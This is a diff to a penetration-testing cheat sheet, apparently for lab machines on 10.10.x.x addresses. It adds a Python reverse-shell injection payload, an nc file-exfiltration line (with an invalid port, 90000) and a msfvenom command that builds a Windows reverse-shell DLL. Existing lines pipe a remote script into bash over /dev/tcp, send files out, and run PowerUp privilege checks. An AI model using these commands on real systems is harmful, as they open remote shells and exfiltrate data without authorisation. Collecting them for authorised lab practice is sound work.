@@ -12,10 +12,13 @@ ssh-keygen -l -E md5 -f ssh_host_rsa_key.pub
 nc -lvnp 9000 < LinEnum.sh
 bash < /dev/tcp/10.10.15.30/9000
 
+';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.92",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
 find / -newermt 2018-10-12 ! -newermt 2018-10-14 -type f -ls 2>/dev/null
 
 nc -lvnp 9000 > myfile.pdf
 cat myfile.pdf > /dev/tcp/10.10.15.30/9000
+nc 10.10.15.30 90000 < myfile
 
 # ping scanner in bash
 #!/bin/bash
@@ -118,3 +121,6 @@ Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
 # check and read NTFS alternate file streams
 get-item -force -path file_name.txt -stream *
 get-content -force -path file_name.txt -stream alternate_ntfs_stream.txt
+
+#generate payload with msfvenom
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.14.117 LPORT=9000 -f dll -a x64 -o /opt/windows_tools/rev.dll --platform reg
